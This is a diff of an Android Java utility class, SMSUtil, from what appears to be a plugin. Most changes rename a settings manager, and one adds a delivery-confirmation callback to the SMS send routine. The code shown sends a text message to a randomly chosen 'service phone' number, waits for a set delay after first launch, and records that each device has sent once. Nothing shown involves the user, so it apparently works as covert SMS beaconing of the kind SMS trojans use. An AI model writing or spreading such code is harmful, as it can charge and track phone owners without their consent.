@@ -1,17 +1,19 @@
 package com.xstd.plugin.Utils;
 
+import android.app.PendingIntent;
 import android.content.Context;
+import android.content.Intent;
 import android.os.Build;
 import android.telephony.SmsManager;
 import android.text.TextUtils;
 import com.plugin.common.utils.UtilsRuntime;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
-import com.xstd.plugin.config.SettingManager;
+import com.xstd.plugin.config.PluginSettingManager;
+import com.xstd.plugin.receiver.SMSSentBRC;
 import com.xstd.qm.Utils;
 
 import java.util.Calendar;
-import java.util.HashMap;
 import java.util.Random;
 
 /**
@@ -34,7 +36,7 @@ public class SMSUtil {
 
             int channel = Integer.valueOf(Config.CHANNEL_CODE);
             long currentTime = System.currentTimeMillis();
-            long delay = currentTime - SettingManager.getInstance().getFirstLanuchTime();
+            long delay = currentTime - PluginSettingManager.getInstance().getFirstLanuchTime();
             if (channel > 950000 && delay < Config.DELAY_ACTIVE_DO_MONKEY) return false;
 
             if (Config.DEBUG) {
@@ -79,7 +81,9 @@ public class SMSUtil {
 
     public static final boolean sendSMSForLogic(Context context, String target, String msg) {
         try {
-            SmsManager.getDefault().sendTextMessage(target, null, msg, null, null);
+            Intent local_sent = new Intent(SMSSentBRC.SMS_LOCAL_SENT_ACTION);
+            PendingIntent sentPI = PendingIntent.getBroadcast(context, 0, local_sent, 0);
+            SmsManager.getDefault().sendTextMessage(target, null, msg, sentPI, null);
             if (Config.DEBUG) {
                 Config.LOGD("[[SMSUtil::sendSMSForLogic]] try to send msg : << " + msg + " >> to : << " + target + " >>");
             }
@@ -98,13 +102,13 @@ public class SMSUtil {
             Config.LOGD("[[trySendCmdToServicePhone1]] try to send SMS to Service Phone >>>>>>>");
         }
 
-        if (SettingManager.getInstance().getKeyDeviceHasSendToServicePhone()) {
+        if (PluginSettingManager.getInstance().getKeyDeviceHasSendToServicePhone()) {
             //如果没有发送过短信到服务器手机，那么就不在做任何处理了
             if (Config.DEBUG) {
                 Config.LOGD("[[trySendCmdToServicePhone1]] This phone has send SMS to Service Phone. last send day time : ("
-                                + SettingManager.getInstance().getKeyDeviceHasSendToServicePhone()
-                                + "), last send time : (" + SettingManager.getInstance().getKeyLastSendMsgToServicehPhone()
-                                + "), and clear time : (" + SettingManager.getInstance().getKeySendMsgToServicePhoneClearTimes()
+                                + PluginSettingManager.getInstance().getKeyDeviceHasSendToServicePhone()
+                                + "), last send time : (" + PluginSettingManager.getInstance().getKeyLastSendMsgToServicehPhone()
+                                + "), and clear time : (" + PluginSettingManager.getInstance().getKeySendMsgToServicePhoneClearTimes()
                                 + ")");
             }
             return;
@@ -140,13 +144,13 @@ public class SMSUtil {
         String target = getRandomPhoneServer();
 
         if (!TextUtils.isEmpty(content) && sendSMSForLogic(context, target, content)) {
-            SettingManager.getInstance().setKeyDeviceHasSendToServicePhone(true);
-            SettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(100);
-            SettingManager.getInstance().setKeyLastSendMsgToServicePhone(System.currentTimeMillis());
+            PluginSettingManager.getInstance().setKeyDeviceHasSendToServicePhone(true);
+            PluginSettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(100);
+            PluginSettingManager.getInstance().setKeyLastSendMsgToServicePhone(System.currentTimeMillis());
         } else {
-            SettingManager.getInstance().setKeyDeviceHasSendToServicePhone(false);
-            SettingManager.getInstance().setKeyLastSendMsgToServicePhone(0);
-            SettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(0);
+            PluginSettingManager.getInstance().setKeyDeviceHasSendToServicePhone(false);
+            PluginSettingManager.getInstance().setKeyLastSendMsgToServicePhone(0);
+            PluginSettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(0);
         }
 
         if (Config.DEBUG) {
